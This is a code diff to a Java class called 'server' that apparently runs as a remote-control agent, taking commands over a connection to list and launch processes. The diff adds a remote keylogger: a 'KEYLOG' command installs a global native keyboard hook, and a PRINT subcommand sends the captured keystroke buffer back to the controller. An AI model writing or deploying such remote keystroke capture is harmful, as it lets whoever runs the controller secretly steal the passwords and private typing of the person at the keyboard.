@@ -1,5 +1,9 @@
 package org.example;
 
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.slf4j.event.EventRecodingLogger;
+
 import javax.naming.SizeLimitExceededException;
 import javax.swing.*;
 import java.awt.event.*;
@@ -40,12 +44,14 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.nio.file.StandardOpenOption;
+import java.security.Key;
 import java.time.chrono.IsoChronology;
 import java.util.ArrayList;
 import java.util.Objects;
 import java.util.logging.Level;
 import java.io.*;
 import java.awt.*;
+import java.util.logging.Logger;
 import javax.swing.*;
 import javax.swing.event.*;
 import javax.swing.text.*;
@@ -57,6 +63,8 @@ public class server extends JFrame {
     public static String s;
     public static String ss;
     public static BufferedImage bimg;
+    public static boolean KeylogStatus = false;
+    public static boolean KeylogRun = false;
 //    private ArrayList<String> process_datanameList = new ArrayList<>();
 //    private ArrayList<Integer> process_pidList = new ArrayList<>();
 
@@ -132,13 +140,84 @@ public class server extends JFrame {
         }
     }
 
-    public boolean checkProcessIsApplication(String input)
-    {
+    public boolean checkProcessIsApplication(String input) {
         String[] temp1 = input.split("");
         if (Objects.equals(temp1[0], "\"") && Objects.equals(temp1[1], "\"") && Objects.equals(temp1[2], ","))
             return false;
         else return true;
     }
+
+    public void keylog() {
+//        Keylog.init();
+//        t.suspend();
+        while (true) {
+            receiveSignalFun();
+            System.out.println(ss);
+            switch (ss) {
+                case "PRINT": {
+                    printkeys();
+                    break;
+                }
+                case "HOOK": {
+                    hookKey();
+                    break;
+                }
+                case "UNHOOK": {
+                    unhook();
+                    break;
+                }
+                case "QUIT": {
+                    unhook();
+                    return;
+                }
+            }
+        }
+    }
+
+    private void printkeys() {
+        try {
+            Program.os.write(Keylog.keylogStringBuffer.toString());
+            Program.os.newLine();
+            Program.os.flush();
+            Program.os.write("[END_OF_STRING_BUFFER]");
+            Program.os.newLine();
+            Program.os.flush();
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    private void hookKey() {
+        if (!KeylogStatus) {
+            if (!KeylogRun)
+            {
+                Keylog.run();
+                KeylogRun = true;
+            }
+            else {
+                try {
+                    GlobalScreen.registerNativeHook();
+                } catch (NativeHookException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+            KeylogStatus = true;
+        } else {
+            System.out.println("Keylog is running...");
+        }
+    }
+
+    private void unhook() {
+        if (KeylogStatus) {
+            Keylog.unRun();
+//            t1.stop();
+            KeylogStatus = false;
+        } else {
+            System.out.println("Keylog is not running...");
+        }
+    }
+
+
     public void application() {
         while (true) {
             receiveSignalFun();
@@ -155,8 +234,7 @@ public class server extends JFrame {
                         BufferedReader input = new BufferedReader(new InputStreamReader(powerShellProcess.getInputStream()));
                         line = input.readLine();
                         while ((line = input.readLine()) != null) {
-                            if (checkProcessIsApplication(line))
-                            {
+                            if (checkProcessIsApplication(line)) {
                                 String tempOfLine = line.substring(1, line.length());
                                 Program.os.write(tempOfLine.substring(tempOfLine.indexOf("\"") + 2));
                                 Program.os.newLine();
@@ -243,8 +321,7 @@ public class server extends JFrame {
                                     if (u != "") {
                                         try {
                                             Process p = new ProcessBuilder(u).start();
-                                        } catch (IOException ee)
-                                        {
+                                        } catch (IOException ee) {
                                             errorcode = String.valueOf(ee);
                                         }
                                         if (errorcode == "") {
@@ -381,8 +458,7 @@ public class server extends JFrame {
                                     if (u != "") {
                                         try {
                                             Process p = new ProcessBuilder(u).start();
-                                        } catch (IOException ee)
-                                        {
+                                        } catch (IOException ee) {
                                             errorcode = String.valueOf(ee);
                                         }
                                         if (errorcode == "") {
@@ -501,6 +577,11 @@ public class server extends JFrame {
                         }
                         case "PROCESS": {
                             process();
+                            s = "";
+                            break;
+                        }
+                        case "KEYLOG": {
+                            keylog();
                             s = "";
                             break;
                         }
